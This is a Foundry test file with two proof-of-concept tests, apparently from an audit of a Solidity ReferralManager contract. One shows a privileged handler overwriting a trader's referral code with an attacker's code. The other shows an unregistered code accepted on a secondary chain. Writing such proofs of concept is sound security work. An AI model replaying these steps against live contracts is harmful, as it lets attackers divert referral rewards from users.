// File: test/ReferralManager.t.sol

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ReferralManager.sol";

contract ReferralManagerTest is Test {
    ReferralManager public referralManager;

    address public owner = makeAddr("owner");
    address public maliciousHandler = makeAddr("maliciousHandler");
    address public referrerAlice = makeAddr("referrerAlice");
    address public traderBob = makeAddr("traderBob");
    address public handlerAttacker = makeAddr("handlerAttacker");

    bytes32 public aliceReferralCode = keccak256("ALICE_CODE");
    bytes32 public attackerReferralCode = keccak256("ATTACKER_CODE");

    function setUp() public {
        vm.startPrank(owner);
        referralManager = new ReferralManager();
        referralManager.initialize();
        vm.stopPrank();
    }

    /// @notice PoC for High-Severity Handler Abuse
    function test_poc_handlerCanHijackReferral() public {
        // --- FIX: Simulate being on the Primary Network ---
        vm.chainId(42161);

        // --- Setup Phase ---
        vm.prank(owner);
        referralManager.setHandler(maliciousHandler, true);

        vm.prank(referrerAlice);
        referralManager.registerReferralCode(aliceReferralCode, referrerAlice);

        vm.prank(handlerAttacker);
        referralManager.registerReferralCode(attackerReferralCode, handlerAttacker);

        // NOTE: setReferrerCode does NOT have the onlyPrimaryNetwork modifier,
        // so we could simulate this part on another chain if we wanted to be more realistic,
        // but for a clear PoC, we can keep it all on the primary chain.
        vm.prank(traderBob);
        referralManager.setReferrerCode(aliceReferralCode);

        // --- Verification: Bob is linked to Alice ---
        (bytes32 initialCode, ) = referralManager.getReferralCodeOf(traderBob);
        assertEq(initialCode, aliceReferralCode, "TraderBob should initially be linked to Alice's code");

        // --- Attack Phase ---
        console.log("--- Malicious handler initiates attack ---");
        vm.prank(maliciousHandler);
        referralManager.setReferrerCodeFor(traderBob, attackerReferralCode);
        console.log("Handler has overwritten TraderBob's referral code.");

        // --- Aftermath ---
        (bytes32 hijackedCode, ) = referralManager.getReferralCodeOf(traderBob);
        console.log("TraderBob is now linked to the attacker's code.");

        // --- Assertion: Hijack was successful ---
        assertEq(hijackedCode, attackerReferralCode, "TraderBob's code should now be the attacker's code");
        assertNotEq(hijackedCode, aliceReferralCode, "TraderBob should no longer be linked to Alice");
    }

    /// @notice PoC for Medium-Severity Invalid Code on Secondary Network
    function test_poc_canSetInvalidCodeOnSecondaryNetwork() public {
        uint256 secondaryChainId = 1;
        vm.chainId(secondaryChainId);

        bytes32 totallyInvalidCode = keccak256("FAKE_CODE_123");

        vm.chainId(42161);
        bool isValid = referralManager.isValidReferralCode(totallyInvalidCode);
        assertEq(isValid, false, "The fake code should not be valid on the primary network");

        vm.chainId(secondaryChainId);

        console.log("--- Trader on secondary network sets an unregistered code ---");
        vm.prank(traderBob);
        referralManager.setReferrerCode(totallyInvalidCode);

        (bytes32 setCode, ) = referralManager.getReferralCodeOf(traderBob);
        assertEq(setCode, totallyInvalidCode, "The contract should allow setting an invalid code on a secondary network");

        console.log("Successfully set an invalid code. Off-chain systems must handle this.");
    }
}
